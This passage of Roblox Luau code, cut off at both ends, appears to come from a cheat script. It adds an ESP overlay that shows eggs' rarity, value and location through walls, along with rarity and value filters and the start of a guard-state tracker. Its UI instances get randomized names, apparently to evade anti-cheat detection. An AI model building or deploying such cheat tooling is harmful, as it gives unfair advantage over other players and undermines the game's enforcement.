		mutationPalette.Outline = Color3.fromRGB(255, 255, 255)

		local rarityPalettes = { Golden = drawingTheme.Palettes.Gold }

		do
			local silver = {}
			local colorSeqText = drawingTheme.Sequence
			local textPoints = {}
			textPoints[1] = { 0, Color3.fromRGB(255, 255, 255) }
			textPoints[2] = { 0.45, Color3.fromRGB(214, 222, 232) }
			textPoints[3] = { 1, Color3.fromRGB(150, 160, 175) }
			silver.Text = colorSeqText(textPoints)

			local colorSeqStroke = drawingTheme.Sequence
			local strokePoints = {}
			strokePoints[1] = { 0, Color3.fromRGB(60, 66, 78) }
			strokePoints[2] = { 0.55, Color3.fromRGB(30, 33, 40) }
			strokePoints[3] = { 1, Color3.fromRGB(10, 11, 14) }
			silver.Stroke = colorSeqStroke(strokePoints)
			silver.Outline = Color3.fromRGB(214, 222, 232)
			rarityPalettes.Silver = silver
		end

		rarityPalettes.Sakura = drawingTheme.PaletteFromColor(Color3.fromRGB(255, 158, 216))
		rarityPalettes.GreatBloom = drawingTheme.PaletteFromColor(Color3.fromRGB(124, 255, 196))
		rarityPalettes.Boss = drawingTheme.PaletteFromColor(Color3.fromRGB(255, 122, 122))
		rarityPalettes.Monstrous = drawingTheme.PaletteFromColor(Color3.fromRGB(192, 139, 255))

		do
			local rainbow = {}
			local colorSeqText = drawingTheme.Sequence
			local textPoints = {}
			textPoints[1] = { 0, Color3.fromRGB(255, 107, 107) }
			textPoints[2] = { 0.2, Color3.fromRGB(255, 179, 107) }
			textPoints[3] = { 0.4, Color3.fromRGB(255, 240, 107) }
			textPoints[4] = { 0.6, Color3.fromRGB(107, 255, 138) }
			textPoints[5] = { 0.8, Color3.fromRGB(107, 200, 255) }
			textPoints[6] = { 1, Color3.fromRGB(185, 107, 255) }
			rainbow.Text = colorSeqText(textPoints)

			local colorSeqStroke = drawingTheme.Sequence
			local strokePoints = {}
			strokePoints[1] = { 0, Color3.fromRGB(20, 20, 30) }
			strokePoints[2] = { 1, Color3.fromRGB(8, 8, 12) }
			rainbow.Stroke = colorSeqStroke(strokePoints)
			rainbow.Outline = Color3.fromRGB(255, 255, 255)
			rainbow.Rotation = 0
			rarityPalettes.Rainbow = rainbow
		end

		local defaultEggPalette = drawingTheme.PaletteFromColor(Color3.fromRGB(143, 227, 255))
		local rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
		local lastEggSnapshotTime = 0

		local eggEspConfig = {
			Eggs = false,
			MinRarity = 5,
			Specific = {},
			MutationSet = {},
			AnyMutation = false,
			NoMutation = false,
			Info = {},
			Highlight = HIGHLIGHT_MODES[1],
			MinValue = 0,
			HighlightMin = 6,
			MaxDistance = math.huge,
			SizeScale = 0.75,
			FixedSize = false,
			OwnBase = true,
		}

		for _, infoCol in ipairs(DEFAULT_EGG_INFO) do
			eggEspConfig.Info[infoCol] = true
		end

		local activeEggDrawings = {}
		local activeEggUids = {}
		local fieldEggsCache = nil
		local isEspEnabled = false
		local updateTick = 0
		local renderUpdateTick = 0
		local refreshQueued = false
		local screenGui = nil
		local numActiveEggs = 0
		local eggPropsCache = {}
		local MAX_HIGHLIGHTS = 18
		local getEggProps, requestRenderRefresh, forceUpdateAllBillboards, mapArrayToSet

		local function getEggAssetProperties(assetCategory)
			getEggProps = getEggAssetProperties
			local cachedProps = eggPropsCache[assetCategory]
			if cachedProps then
				return cachedProps
			end
			local directory = gameModules.Assets and gameModules.Assets.Directory
			local assetData = type(directory) == "table" and directory[assetCategory]
			local rarity = type(assetData) == "table" and type(assetData.Rarity) == "table" and assetData.Rarity or nil
			local rarityColor = rarity and typeof(rarity.Color) == "Color3" and rarity.Color or Color3.new(1, 1, 1)
			local colorPalette = drawingTheme.PaletteFromColor(rarityColor)
			local rarityGradient = rarity and rarity.RarityGradient

			if rarity and typeof(rarityGradient) ~= "Instance" then
				local assets = ReplicatedStorage:FindFirstChild("Assets")
				assets = assets and assets:FindFirstChild("UI")
				assets = assets and assets:FindFirstChild("RarityGradients")

				if assets then
					assets = assets:FindFirstChild(tostring(rarity._id or rarity.DisplayName or ""))
				end

				rarityGradient = assets and assets:FindFirstChild("RarityGradient") or nil
			end

			if typeof(rarityGradient) == "Instance" and rarityGradient:IsA("UIGradient") then
				colorPalette.Text = rarityGradient.Color
				colorPalette.Rotation = rarityGradient.Rotation
			end

			local rarityName

			if rarity then
				rarityName = tostring(rarity.DisplayName or rarity._id or "")
			else
				rarityName = rarity
			end

			rarityName = rarityName or ""
			local rarityPalette

			if string.upper(rarityName) ~= "SECRET" then
				rarityPalette = colorPalette
			else
				rarityPalette = { Text = secretGradient, Stroke = colorPalette.Stroke, Outline = colorPalette.Outline, Rotation = 90 }
			end

			local props = {}
			local rarityNumber

			if rarity then
				rarityNumber = tonumber(rarity.RarityNumber or rarity.Rank)
			else
				rarityNumber = rarity
			end

			props.Number = rarityNumber or 0
			props.Name = rarityName
			props.Color = rarityColor
			props.Palette = colorPalette
			props.RarityPalette = rarityPalette
			local displayName = type(assetData) == "table"

			if displayName then
				displayName = tostring(assetData.DisplayName or assetCategory)
			end

			props.DisplayName = displayName or tostring(assetCategory)
			props.Icon = type(assetData) == "table" and assetData.Icon or nil
			props.EarningRate = type(assetData) == "table" and tonumber(assetData.EarningRate) or 0
			eggPropsCache[assetCategory] = props
			return props
		end

		local forceUpdateBillboard

		do
			local function getAreaEggSlotHitbox(uid)
				local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")
				areaEggSlotsClient = areaEggSlotsClient and areaEggSlotsClient:FindFirstChild(uid)
				if areaEggSlotsClient and areaEggSlotsClient:IsA("Model") then
					local hitbox = areaEggSlotsClient:FindFirstChild("Hitbox")
					return areaEggSlotsClient, hitbox and hitbox:IsA("BasePart") and hitbox or nil
				end
				return nil, nil
			end

			local function ensureScreenGui()
				if not screenGui or not screenGui.Parent then
					screenGui = drawingTheme.CreateRuntime()
				end
			end

			local function formatNumber(num)
				local val = tonumber(num) or 0
				local suffixes = { "", "K", "M", "B", "T", "Qa", "Qi" }
				local index = 1

				while math.abs(val) >= 1000 and index < #suffixes do
					val /= 1000
					index += 1
				end

				return string.format(index == 1 and "%.0f%s" or "%.2f%s", val, suffixes[index])
			end

			local function calculateMaxDistance(sizeOffset)
				local currentCamera = workspace.CurrentCamera
				if not currentCamera then
					return eggEspConfig.MaxDistance
				end
				return math.min(eggEspConfig.MaxDistance, sizeOffset * currentCamera.ViewportSize.Y / 2 * 20 * math.tan(math.rad(currentCamera.FieldOfView) * 0.5))
			end

			local function updateEggBillboardSize(drawing)
				local rows = {
					{ drawing.IconHolder, EGG_INFO_SCALES.Icon, drawing.ShowIcon },
					{ drawing.NameRow.Holder, EGG_INFO_SCALES.Name, drawing.ShowName },
					{ drawing.RarityRow.Holder, EGG_INFO_SCALES.Rarity, drawing.ShowRarity },
					{ drawing.MutationRow.Holder, EGG_INFO_SCALES.Mutation, drawing.ShowMutation },
					{ drawing.ValueRow.Holder, EGG_INFO_SCALES.Value, drawing.ShowValue },
					{ drawing.ExtraRow.Holder, EGG_INFO_SCALES.Info, drawing.ShowExtra },
				}

				local totalScale = 0

				for _, rowData in ipairs(rows) do
					if rowData[3] then
						totalScale += rowData[2]
					end
				end

				local maxScale = math.max(totalScale, 1)

				for _, rowData in ipairs(rows) do
					rowData[1].Visible = rowData[3]
					rowData[1].Size = UDim2.fromScale(1, rowData[3] and rowData[2] / maxScale or 0)
				end

				local scaledWidth = drawingTheme.ScaledWidth(120, eggEspConfig.SizeScale)
				local height = math.max(1, math.floor(drawingTheme.RowHeight(eggEspConfig.SizeScale) * maxScale))

				if drawing.Width ~= scaledWidth or drawing.Height ~= height or drawing.Fixed ~= eggEspConfig.FixedSize then
					drawing.Width = scaledWidth
					drawing.Height = height
					drawing.Fixed = eggEspConfig.FixedSize

					if eggEspConfig.FixedSize then
						local sizeOffset = 4.5 * eggEspConfig.SizeScale
						drawing.Billboard.Size = UDim2.fromScale(sizeOffset, sizeOffset * height / scaledWidth)
						drawing.Billboard.MaxDistance = calculateMaxDistance(sizeOffset)
					else
						drawing.Billboard.Size = UDim2.fromOffset(scaledWidth, height)
						drawing.Billboard.MaxDistance = eggEspConfig.MaxDistance
					end
				end
			end

			forceUpdateBillboard = function(drawing)
				drawing.Width = nil
				updateEggBillboardSize(drawing)
			end

			local function createEggDrawing()
				local billboardGui, frameContainer = drawingTheme.CreateTag(screenGui, eggEspConfig.MaxDistance)
				local frame = Instance.new("Frame")
				frame.Name = generateRandomKey()
				frame.BackgroundTransparency = 1
				frame.BorderSizePixel = 0
				frame.LayoutOrder = 0
				frame.Parent = frameContainer
				local imageLabel = Instance.new("ImageLabel")
				imageLabel.Name = generateRandomKey()
				imageLabel.AnchorPoint = Vector2.new(0.5, 1)
				imageLabel.BackgroundTransparency = 1
				imageLabel.Position = UDim2.fromScale(0.5, 1)
				imageLabel.Size = UDim2.fromScale(1, 1)
				imageLabel.ScaleType = Enum.ScaleType.Fit
				imageLabel.Parent = frame
				local uiAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
				uiAspectRatioConstraint.Name = generateRandomKey()
				uiAspectRatioConstraint.AspectRatio = 1
				uiAspectRatioConstraint.DominantAxis = Enum.DominantAxis.Height
				uiAspectRatioConstraint.Parent = imageLabel

				local drawing = {
					Billboard = billboardGui,
					IconHolder = frame,
					Icon = imageLabel,
					NameRow = drawingTheme.CreateTextRow(frameContainer, drawingTheme.MainFont, 1, 0.4),
					RarityRow = drawingTheme.CreateTextRow(frameContainer, predictorFont, 2, 0.2),
					MutationRow = drawingTheme.CreateTextRow(frameContainer, drawingTheme.MainFont, 3, 0.2),
					ValueRow = drawingTheme.CreateTextRow(frameContainer, drawingTheme.MainFont, 4, 0.2),
					ExtraRow = drawingTheme.CreateTextRow(frameContainer, drawingTheme.MainFont, 5, 0.2),
					Highlight = nil,
					Anchor = nil,
					CFrame = nil,
					Width = nil,
					Height = nil,
					ShowIcon = false,
					ShowName = true,
					ShowRarity = false,
					ShowMutation = false,
					ShowValue = false,
					ShowExtra = false,
				}

				updateEggBillboardSize(drawing)
				return drawing
			end

			local function destroyEggHighlight(drawing)
				if drawing.Highlight then
					drawing.Highlight:Destroy()
					drawing.Highlight = nil
					numActiveEggs -= 1
				end
			end

			local function calculateEggValue(eggInfo, props)
				local scale = tonumber(eggInfo.AssetScale) or 1
				local multiplier = scale > 5 and (scale / 5) ^ 1.2 * 19.637875755794113 or scale ^ 1.85
				local mutationsMod = gameModules.Mutations
				local hasMutations = type(mutationsMod) == "table" and type(mutationsMod.EarningsFor) == "function"
				local mutationMult = 1

				if hasMutations then
					local ok, result = pcall(mutationsMod.EarningsFor, type(eggInfo.Mutations) == "table" and eggInfo.Mutations or {})
					local isValid = ok and type(result) == "number"
					local fallback = 1

					if isValid then
						mutationMult = result
					else
						mutationMult = fallback
					end
				end

				return props.EarningRate * multiplier * mutationMult
			end

			local function pollEggs()
				local eggInfoList = {}
				local placedEggRenders = workspace:FindFirstChild("PlacedEggRenders")
				if not placedEggRenders then
					return eggInfoList
				end
				local result = getOwnerEggs()
				if type(result) ~= "table" then
					return eggInfoList
				end
				local userIdStr = tostring(localPlayer.UserId)
				local eggRendersList = {}

				for _, child in ipairs(placedEggRenders:GetChildren()) do
					if string.find(child.Name, userIdStr, 1, true) then
						eggRendersList[#eggRendersList + 1] = child
					end
				end

				for eggUid, eggData in pairs(result) do
					if type(eggData) == "table" and eggData.Placement ~= nil and type(eggData.AssetCategory) == "string" then
						local uidStr = tostring(eggUid)
						local renderModel = nil

						for _, renderChild in ipairs(eggRendersList) do
							if renderChild.Name == uidStr or string.find(renderChild.Name, uidStr, 1, true) or renderChild:GetAttribute("Uid") == uidStr then
								renderModel = renderChild
								break
							end
						end

						if renderModel then
							local ok2, eggCFrame = pcall(function()
								return renderModel:IsA("Model") and renderModel:GetPivot() or renderModel.CFrame
							end)

							local mutations = type(eggData.Mutations) == "table" and eggData.Mutations or {}

							eggInfoList[#eggInfoList + 1] = {
								Uid = "base:" .. uidStr,
								AssetCategory = eggData.AssetCategory,
								AssetScale = eggData.AssetScale,
								Mutations = mutations,
								BaseMutation = eggData.BaseMutation or mutations[1],
								State = "Base",
								AreaId = "Your Base",
								BottomCFrame = ok2 and eggCFrame or nil,
								Model = renderModel,
							}
						end
					end
				end

				return eggInfoList
			end

			local function shouldShowEgg(eggInfo, props)
				if eggInfo.State == "Claimed" then
					return false
				end

				if eggEspConfig.MinRarity > 0 and props.Number < eggEspConfig.MinRarity then
					return false
				end
				local useMinValue = eggEspConfig.MinValue > 0

				if useMinValue then
					local minValue = eggEspConfig.MinValue
					useMinValue = calculateEggValue(eggInfo, props) < minValue
				end

				if useMinValue then
					return false
				end
				return true
			end

			local function updateEggDrawing(drawing, eggInfo, props)
				local model, hitbox

				if typeof(eggInfo.Model) == "Instance" then
					model = eggInfo.Model
					hitbox = model:FindFirstChild("Hitbox", true) or model:FindFirstChildWhichIsA("BasePart", true)
					hitbox = hitbox and hitbox:IsA("BasePart") and hitbox or nil
				else
					model, hitbox = getAreaEggSlotHitbox(eggInfo.Uid)
				end

				local bottomCFrame = eggInfo.BottomCFrame

				if typeof(bottomCFrame) == "CFrame" then
					local terrain = hitbox or workspace.Terrain

					if drawing.Anchor ~= terrain or drawing.CFrame ~= bottomCFrame then
						drawing.Anchor = terrain
						drawing.CFrame = bottomCFrame
						drawing.Billboard.Adornee = terrain
						drawing.Billboard.StudsOffsetWorldSpace = bottomCFrame.Position - terrain.Position + Vector3.new(0, (hitbox and hitbox.Position.Y - bottomCFrame.Position.Y or 1) + 0.8, 0)
					end
				end

				local info = eggEspConfig.Info
				local baseMutation = eggInfo.BaseMutation
				local showMutation = type(baseMutation) == "string" and baseMutation ~= ""
				local scale = tonumber(eggInfo.AssetScale) or 1
				local showIcon = info.Icon == true and props.Icon ~= nil

				if showIcon and drawing.Icon.Image ~= tostring(props.Icon) then
					drawing.Icon.Image = tostring(props.Icon)
				end

				local showName = info.Name == true

				if showName then
					drawingTheme.SetRow(drawing.NameRow, props.DisplayName, mutationPalette)
				end

				local showRarity = info.Rarity == true and props.Name ~= ""

				if showRarity then
					local palette = props.RarityPalette
					drawingTheme.SetRow(drawing.RarityRow, string.upper(props.Name), palette)
				end

				showMutation = info.Mutation == true and showMutation

				if showMutation then
					drawingTheme.SetRow(drawing.MutationRow, string.upper(getAreaDisplayName(baseMutation)), rarityPalettes[baseMutation] or defaultEggPalette)
				end

				local showValue = info.Value == true

				if showValue then
					drawingTheme.SetRow(drawing.ValueRow, "$" .. formatNumber(calculateEggValue(eggInfo, props)) .. "/s", predictorPalette)
				end

				local extraInfoList = {}
				local eggRecords = gameModules.EggRecords

				if info.Weight and type(eggRecords) == "table" and type(eggRecords.WeightKgForScale) == "function" then
					local ok, result = pcall(eggRecords.WeightKgForScale, eggInfo.AssetCategory, scale)

					if ok and tonumber(result) then
						table.insert(extraInfoList, formatNumber(result) .. " kg")
					end
				end

				if info.Size then
					table.insert(extraInfoList, string.format("x%.2f", scale))
				end

				if info["Sell Price"] and type(eggRecords) == "table" and type(eggRecords.SellPrice) == "function" then
					local ok, result = pcall(eggRecords.SellPrice, eggInfo)

					if ok and tonumber(result) then
						table.insert(extraInfoList, "$" .. formatNumber(result))
					end
				end

				if info.Distance and typeof(bottomCFrame) == "CFrame" then
					local character = localPlayer.Character
					character = character and character:FindFirstChild("HumanoidRootPart")

					if character then
						table.insert(extraInfoList, string.format("%dm", math.floor((character.Position - bottomCFrame.Position).Magnitude + 0.5)))
					end
				end

				if info.Area and eggInfo.AreaId ~= nil then
					table.insert(extraInfoList, tostring(eggInfo.AreaId))
				end

				if info.State and eggInfo.State ~= nil and eggInfo.State ~= "Slot" then
					table.insert(extraInfoList, tostring(eggInfo.State))
				end

				local showExtra = #extraInfoList > 0

				if showExtra then
					drawingTheme.SetRow(drawing.ExtraRow, table.concat(extraInfoList, "  |  "), drawingTheme.Palettes.Sheen)
				end

				if drawing.ShowIcon ~= showIcon or drawing.ShowName ~= showName or drawing.ShowRarity ~= showRarity or drawing.ShowMutation ~= showMutation or drawing.ShowValue ~= showValue or drawing.ShowExtra ~= showExtra then
					drawing.ShowIcon = showIcon
					drawing.ShowName = showName
					drawing.ShowRarity = showRarity
					drawing.ShowMutation = showMutation
					drawing.ShowValue = showValue
					drawing.ShowExtra = showExtra
					updateEggBillboardSize(drawing)
				end

				if (eggEspConfig.Highlight == HIGHLIGHT_MODES[3] or eggEspConfig.Highlight == HIGHLIGHT_MODES[2] and props.Number >= eggEspConfig.HighlightMin) and model then
					if not drawing.Highlight and numActiveEggs < MAX_HIGHLIGHTS then
						local highlight = Instance.new("Highlight")
						highlight.Name = generateRandomKey()
						highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
						highlight.FillTransparency = 0.82
						highlight.OutlineTransparency = 0.05
						highlight.FillColor = props.Color
						highlight.OutlineColor = props.Palette.Outline
						highlight.Parent = screenGui
						drawing.Highlight = highlight
						numActiveEggs += 1
					end

					if drawing.Highlight and drawing.Highlight.Adornee ~= model then
						drawing.Highlight.Adornee = model
					end
				else
					destroyEggHighlight(drawing)
				end
			end

			local function cleanupEggDrawing(drawing)
				destroyEggHighlight(drawing)
				drawing.Billboard:Destroy()
			end

			local function clearAllEggDrawings()
				local drawingsToClear = activeEggDrawings
				local guiToClear = screenGui
				activeEggDrawings = {}
				screenGui = nil
				numActiveEggs = 0

				task.spawn(function()
					local now = os.clock()

					for _, drawing in pairs(drawingsToClear) do
						if drawing.Highlight then
							drawing.Highlight:Destroy()
						end

						drawing.Billboard:Destroy()

						if 0.002 < os.clock() - now then
							RunService.Heartbeat:Wait()
							now = os.clock()
						end
					end

					if guiToClear then
						guiToClear:Destroy()
					end
				end)
			end

			local function processEggs(eggsList, cameraTick, logicTick)
				local function isValidTick()
					return cameraTick == renderUpdateTick and logicTick == updateTick and isEspEnabled
				end

				ensureScreenGui()
				local processedUids = {}
				local now = os.clock()

				for _, eggInfo in pairs(eggsList) do
					local uid = type(eggInfo) == "table" and eggInfo.Uid

					if type(uid) == "string" and type(eggInfo.AssetCategory) == "string" then
						local props = getEggProps(eggInfo.AssetCategory)

						if eggEspConfig.Eggs and shouldShowEgg(eggInfo, props) then
							processedUids[uid] = true
							local drawing = activeEggDrawings[uid]

							if not drawing then
								drawing = createEggDrawing()
								activeEggDrawings[uid] = drawing
							end

							updateEggDrawing(drawing, eggInfo, props)
						end
					end

					if not (0.002 < os.clock() - now) then
						continue
					end
					RunService.Heartbeat:Wait()
					now = os.clock()
					if not isValidTick() then
						return
					end
				end

				if eggEspConfig.Eggs and eggEspConfig.OwnBase then
					for _, eggInfo in ipairs(pollEggs()) do
						local props = getEggProps(eggInfo.AssetCategory)

						if shouldShowEgg(eggInfo, props) then
							processedUids[eggInfo.Uid] = true
							local drawing = activeEggDrawings[eggInfo.Uid]

							if not drawing then
								drawing = createEggDrawing()
								activeEggDrawings[eggInfo.Uid] = drawing
							end

							updateEggDrawing(drawing, eggInfo, props)
						end
					end
				end

				for k, drawing in pairs(activeEggDrawings) do
					if not processedUids[k] then
						activeEggDrawings[k] = nil
						cleanupEggDrawing(drawing)
					end
				end

				return true
			end

			local renderRefreshRequested = false
			local renderRefreshRunning = false

			local function triggerRenderRefresh()
				if not isEspEnabled or not fieldEggsCache then
					return
				end
				renderRefreshRequested = true
				if renderRefreshRunning then
					return
				end
				renderRefreshRunning = true

				task.defer(function()
					while isEspEnabled and fieldEggsCache and renderRefreshRequested do
						renderRefreshRequested = false
						renderUpdateTick += 1
						local ok, result = pcall(processEggs, fieldEggsCache, renderUpdateTick, updateTick)

						if ok and result ~= true then
							renderRefreshRequested = true
						end

						RunService.Heartbeat:Wait()
					end

					renderRefreshRunning = false
				end)
			end
			requestRenderRefresh = triggerRenderRefresh

			local function fetchAndProcessEggs()
				local startTick = updateTick

				if fieldEggsCache and next(activeEggDrawings) == nil then
					triggerRenderRefresh()
				end

				local records = fetchFieldEggs()
				if records == nil and rfEggWorldAskFieldEggSnapshot and os.clock() >= lastEggSnapshotTime then
					lastEggSnapshotTime = os.clock() + 30
					local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)

					if ok and type(result) == "table" and type(result.Records) == "table" then
						records = result.Records
					end
				end

				if records == nil and rfEggWorldAskFieldEggSnapshot and os.clock() >= lastEggSnapshotTime then
					lastEggSnapshotTime = os.clock() + 30
					local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)

					if ok and type(result) == "table" and type(result.Records) == "table" then
						records = result.Records
					end
				end

				if startTick ~= updateTick or not isEspEnabled then
					return
				end

				if records ~= nil then
					local copiedRecords = {}

					for k, record in pairs(records) do
						copiedRecords[k] = record
					end

					fieldEggsCache = copiedRecords
				end

				if fieldEggsCache then
					triggerRenderRefresh()
				end
			end

			local function scheduleFetchAndProcessEggs()
				task.spawn(pcall, fetchAndProcessEggs)
			end

			local function queueEggRefresh()
				if refreshQueued then
					return
				end
				refreshQueued = true

				task.delay(0.5, function()
					refreshQueued = false

					if isEspEnabled then
						scheduleFetchAndProcessEggs()
					end
				end)
			end

			forceUpdateAllBillboards = function()
				for _, drawing in pairs(activeEggDrawings) do
					forceUpdateBillboard(drawing)
				end
			end

			local function disableEggEsp()
				isEspEnabled = false
				updateTick += 1
				renderUpdateTick += 1
				drawingTheme.DisconnectAll(activeEggUids)
				clearAllEggDrawings()
			end

			local function enableEggEsp()
				if isEspEnabled then
					scheduleFetchAndProcessEggs()
					return
				end
				isEspEnabled = true
				local currentTick = updateTick
				local eggState = gameModules.EggState

				if type(eggState) == "table" then
					for _, eventName in ipairs({ "FieldRefreshed", "FieldShifted", "FieldGone", "FieldClaimed", "SnapshotRefreshed" }) do
						local eventObj = eggState[eventName]

						if type(eventObj) == "table" and type(eventObj.Connect) == "function" then
							local ok, result = pcall(eventObj.Connect, eventObj, queueEggRefresh)

							if ok and result then
								table.insert(activeEggUids, result)
							end
						end
					end
				end

				for _, folderName in ipairs({ "AreaEggSlotsClient", "PlacedEggRenders" }) do
					local folder = workspace:FindFirstChild(folderName)

					if folder then
						table.insert(activeEggUids, folder.ChildAdded:Connect(queueEggRefresh))
						table.insert(activeEggUids, folder.ChildRemoved:Connect(queueEggRefresh))
					end
				end

				task.spawn(function()
					while currentTick == updateTick do
						task.wait(10)
						if currentTick == updateTick then
							queueEggRefresh()
							continue
						end
						break
					end
				end)

				task.spawn(function()
					while currentTick == updateTick do
						task.wait(1)

						if currentTick == updateTick then
							if eggEspConfig.Info.Distance then
								triggerRenderRefresh()
							end

							continue
						end

						break
					end
				end)

				scheduleFetchAndProcessEggs()
			end

			local function syncEggEspState()
				if eggEspConfig.Eggs then
					enableEggEsp()
				else
					disableEggEsp()
				end
			end

			eggEspHandles = { Eggs = nil }
			local eggEspDefaults = { Eggs = false }
			local isSyncingEsp = false

			local function checkEggEspState()
				if isSyncingEsp then
					return
				end
				local isEnabled = drawingTheme.ReadToggle(eggEspHandles.Eggs, eggEspDefaults.Eggs)
				if isEnabled == eggEspConfig.Eggs and isEspEnabled == isEnabled then
					return
				end
				eggEspConfig.Eggs = isEnabled
				syncEggEspState()
			end

			trackCleanup(function()
				isSyncingEsp = true
				eggEspConfig.Eggs = false
				disableEggEsp()
			end)

			mapArrayToSet = function(arr)
				local set = {}

				if type(arr) == "table" then
					for k, v in pairs(arr) do
						k = v == true and type(k) == "string" and k
						local keyName

						if k then
							keyName = k
						else
							keyName = type(v) == "string" and v
						end

						keyName = keyName or nil

						if keyName then
							set[keyName] = true
						end
					end
				end

				return set
			end

			eggEspHandles.Eggs = espSection:CreateToggle({
				Name = "ESP Eggs",
				Default = false,
				Callback = function(enabled)
					eggEspDefaults.Eggs = enabled == true
					drawingTheme.SyncSoon(checkEggEspState)
				end,
			})
		end

		espSection:CreateToggle({
			Name = "ESP Fixed Size",
			Default = false,
			SubOf = eggEspHandles.Eggs,
			Callback = function(enabled)
				local fixedSize = enabled == true

				if eggEspConfig.FixedSize ~= fixedSize then
					eggEspConfig.FixedSize = fixedSize
					forceUpdateAllBillboards()
				end
			end,
		})

		espSection:CreateToggle({
			Name = "ESP Own Base Eggs",
			Note = "Also show the eggs placed in your own base",
			Default = true,
			SubOf = eggEspHandles.Eggs,
			Callback = function(enabled)
				eggEspConfig.OwnBase = enabled ~= false
				requestRenderRefresh()
			end,
		})

		do
			local anyRarityOptions = { "Any" }
			local rarityOptionMap = { Any = 0 }
			local specificEggOptions = {}
			local specificEggOptionMap = {}
			local mutationOptions = { "Any Mutation", "No Mutation" }
			local directory = gameModules.Assets and gameModules.Assets.Directory
			local rarityNameMap = {}
			local eggDataList = {}

			if type(directory) == "table" then
				for k, assetData in pairs(directory) do
					local rarity = type(assetData) == "table" and assetData.Rarity or nil
					local rarityNum = type(rarity) == "table"

					if rarityNum then
						rarityNum = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					rarityNum = rarityNum or nil

					if rarityNum then
						local str = tostring(rarity.DisplayName or rarity._id or rarityNum)
						rarityNameMap[rarityNum] = rarityNameMap[rarityNum] or str

						table.insert(eggDataList, {
							Category = tostring(k),
							Name = tostring(assetData.DisplayName or k),
							Rarity = rarityNum,
							RarityName = str,
						})
					end
				end
			end

			local sortedRarities = {}

			for k in pairs(rarityNameMap) do
				table.insert(sortedRarities, k)
			end

			table.sort(sortedRarities)

			for _, rarityNum in ipairs(sortedRarities) do
				local str = string.format("%d - %s", rarityNum, rarityNameMap[rarityNum])
				table.insert(anyRarityOptions, str)
				rarityOptionMap[str] = rarityNum
			end

			table.sort(eggDataList, function(a, b)
				if a.Rarity ~= b.Rarity then
					return a.Rarity > b.Rarity
				end
				return a.Name < b.Name
			end)

			for _, eggData in ipairs(eggDataList) do
				local str = string.format("%s [%s]", eggData.Name, eggData.RarityName)

				if specificEggOptionMap[str] then
					str = string.format("%s [%s] (%s)", eggData.Name, eggData.RarityName, eggData.Category)
				end

				table.insert(specificEggOptions, str)
				specificEggOptionMap[str] = eggData.Category
			end

			local availableMutations = {}
			local mutations = gameModules.Mutations

			if type(mutations) == "table" and type(mutations.IdSet) == "table" then
				for k in pairs(mutations.IdSet) do
					table.insert(availableMutations, tostring(k))
				end
			end

			table.sort(availableMutations)

			for _, mutationName in ipairs(availableMutations) do
				table.insert(mutationOptions, mutationName)
			end

			local function getMinRarityDefault(targetRarity)
				for _, optionName in ipairs(anyRarityOptions) do
					if rarityOptionMap[optionName] == targetRarity then
						return optionName
					end
				end

				return anyRarityOptions[1]
			end

			espSection:CreateDropdown({
				Name = "ESP Min Rarity",
				Note = "Show eggs of the chosen rarity and every rarity above it",
				Options = anyRarityOptions,
				Default = getMinRarityDefault(5),
				SubOf = eggEspHandles.Eggs,
				Callback = function(arg)
					eggEspConfig.MinRarity = rarityOptionMap[type(arg) == "table" and arg[1] or arg] or 0
					requestRenderRefresh()
				end,
			})
		end

		hookDropdownAllLabel(espSection:CreateMultiDropdown({
			Name = "ESP Show Info",
			Options = EGG_COLUMNS,
			Default = DEFAULT_EGG_INFO,
			SubOf = eggEspHandles.Eggs,
			Callback = function(arg)
				eggEspConfig.Info = mapArrayToSet(arg)
				requestRenderRefresh()
			end,
		}))

		do
			local valueSuffixes = {
				["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
				["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
				["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
			}

			local currentMinVal = 0
			local currentSuffix = "M/s"

			local function updateMinValue(valArg, suffixArg)
				if valArg ~= nil then
					currentMinVal = math.max(0, math.floor(tonumber(valArg) or currentMinVal))
				end

				if suffixArg ~= nil then
					currentSuffix = tostring(suffixArg)
				end

				eggEspConfig.MinValue = currentMinVal * (valueSuffixes[currentSuffix] or valueSuffixes["M/s"]).Mult
				requestRenderRefresh()
			end

			formatNumberSuffix(espSection, {
				Name = "Min ESP Value",
				SubOf = eggEspHandles.Eggs,
				Legacy = "ESP Min Value",
				SectionName = "ESP",
				OnRaw = function(arg)
					updateMinValue(math.floor(arg / 1000), "K/s")
				end,
			})
		end

		espSection:CreateSlider({
			Name = "ESP Egg Size",
			Min = 50,
			Max = 200,
			Default = 75,
			Increment = 5,
			Unit = "%",
			SubOf = eggEspHandles.Eggs,
			Callback = function(arg)
				local num = tonumber(arg)

				if num and eggEspConfig.SizeScale ~= num / 100 then
					eggEspConfig.SizeScale = num / 100
					forceUpdateAllBillboards()
				end
			end,
		})

		do
			local guardYOffset = 1
			local guardEspSizeScale = 0.75

			local guardStatePalettes = {
				Sleeping = drawingTheme.Palettes.Accent,
				Waking = drawingTheme.Palettes.Gold,
				Chasing = drawingTheme.Palettes.Red,
			}

			local orangePalette = drawingTheme.Palettes.Orange
			local activeGuardDrawings = {}
			local guardConnections = {}
			local isGuardEspEnabled = false
			local guardScreenGui = nil

			local function getGuardStateText(guardModel)
				local state = guardModel:GetAttribute("GuardState")
				if state == "Sleeping" then
					return "Sleeping"
				end

				if state == "Waking" then
					return "Waking Up"
				end

				if state == "Chasing" then
					local targetUserId = guardModel:GetAttribute("TargetPlayer")
					if targetUserId == tostring(localPlayer.UserId) then
						return "Chasing You"
					end
					local targetPlayer = tonumber(targetUserId) and Players:GetPlayerByUserId(tonumber(targetUserId))
					return targetPlayer and "Chasing " .. targetPlayer.DisplayName or "Chasing"
				end

				return state and tostring(state) or "Awake"
			end

			local function updateGuardDrawingState(drawing, guardModel)
				local palette = guardStatePalettes[guardModel:GetAttribute("GuardState")] or orangePalette
				drawing.Highlight.FillColor = palette.Outline
				drawing.Highlight.OutlineColor = palette.Outline
